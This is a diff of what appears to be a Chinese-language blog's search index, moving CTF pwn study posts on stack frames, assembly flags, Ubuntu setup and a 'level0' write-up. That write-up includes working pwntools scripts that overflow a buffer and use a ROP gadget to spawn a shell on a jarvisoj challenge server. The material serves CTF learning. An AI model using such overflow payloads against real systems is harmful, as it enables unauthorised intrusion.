@@ -38,66 +38,6 @@
       </tags>
   </entry>
   <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>drops做题收获</title>
     <url>/2019/08/08/p/</url>
     <content><![CDATA[<a id="more"></a>
@@ -214,6 +154,66 @@ payload=&apos;9&apos;*36+p32(0x080486cc)
 print p.recvuntil(&quot;&gt; &quot;)
 p.sendline(payload)
 print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
+]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
 ]]></content>
       <tags>
         <tag>做题题解</tag>
@@ -410,28 +410,6 @@ CMD [&quot;app.py&quot;]
 这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
-    <title>stack</title>
-    <url>/2019/09/27/stack_explain/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
-<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
-<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
-<pre><code>push   ebp       压栈 esp减小 存入ebp内容
-mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
-<p>一个栈帧从高地址到低地址应该是</p>
-<pre><code>函数参数
-函数返回地址
-ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
-栈内数据
-esp  </code></pre><p>待更新。。</p>
-]]></content>
-      <tags>
-        <tag>有关栈</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shell</title>
     <url>/2019/10/09/shell/</url>
     <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
@@ -452,6 +430,28 @@ shell管理你与操作系统之间的交互：
 ]]></content>
       <tags>
         <tag>计算机基础概念</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack</title>
+    <url>/2019/09/27/stack_explain/</url>
+    <content><![CDATA[<a id="more"></a>
+
+
+<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
+<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
+<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
+<pre><code>push   ebp       压栈 esp减小 存入ebp内容
+mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
+<p>一个栈帧从高地址到低地址应该是</p>
+<pre><code>函数参数
+函数返回地址
+ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
+栈内数据
+esp  </code></pre><p>待更新。。</p>
+]]></content>
+      <tags>
+        <tag>有关栈</tag>
       </tags>
   </entry>
   <entry>
@@ -521,48 +521,6 @@ io.sendline(&quot;5&quot;)
 io.interactive()    </code></pre>]]></content>
       <tags>
         <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu16.04配置</title>
-    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
-
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
-
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
-
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
-
-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
@@ -642,6 +600,48 @@ sudo gedit pip.conf
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
         <tag>pwn学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu16.04配置</title>
+    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
+<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
+<p>#拍快照</p>
+<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
+<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
+<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
+https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
+https://www.cnblogs.com/flyinggod/p/7979108.html
+不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+
+解决问题E: Could not get lock /var/lib/apt/lists/lock
+https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update
+
+网址    https://www.jianshu.com/p/568aab038d4c
+    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<pre><code>sudo mkdir ~/.pip/
+cd ./.pip/
+touch pip.conf
+sudo gedit pip.conf 
+
+网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
+        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
+<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
